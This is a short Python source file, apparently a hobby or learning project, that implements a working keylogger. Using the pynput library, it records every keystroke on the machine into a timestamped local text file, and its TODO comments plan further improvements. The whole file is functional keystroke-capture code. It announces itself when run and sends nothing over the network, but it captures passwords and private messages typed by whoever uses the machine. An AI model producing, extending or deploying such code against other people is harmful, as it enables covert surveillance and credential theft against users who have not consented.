import os
import datetime
from pynput import keyboard

# Need to  update to be able to close program in terminal with CTRL + C
# Update to include ? and other special chars that require [shift]
# Brainstorm additional ways to improve overall functionality

class Keylogger:
    def __init__(self, log_dir="keylog"):
        if not os.path.exists(log_dir):
            os.makedirs(log_dir)

        self.log_dir = log_dir
        self.log_file = os.path.join(
            self.log_dir,
            f"keylog_{datetime.datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
        )
        
    def on_press(self, key):
        try:
            with open(self.log_file, "a") as f:
                f.write(key.char)
        except AttributeError:
            with open(self.log_file, "a") as f:
                if key == keyboard.Key.space:
                    f.write(" ")
                elif key == keyboard.Key.enter:
                    f.write("\n")
                elif key == keyboard.Key.tab:
                    f.write("\t")
                else:
                    f.write(f"[{str(key)}]")

    def start(self):
        print(f"Keylogger started. Logs will be saved to {self.log_file}")
        print("Press Ctrl+C in the terminal to stop")

        with keyboard.Listener(on_press=self.on_press) as listener:
            try:
                listener.join()
            except KeyboardInterrupt:
                print("\nKeylogger stopped")

if __name__ == "__main__":
    keylogger = Keylogger()
    keylogger.start()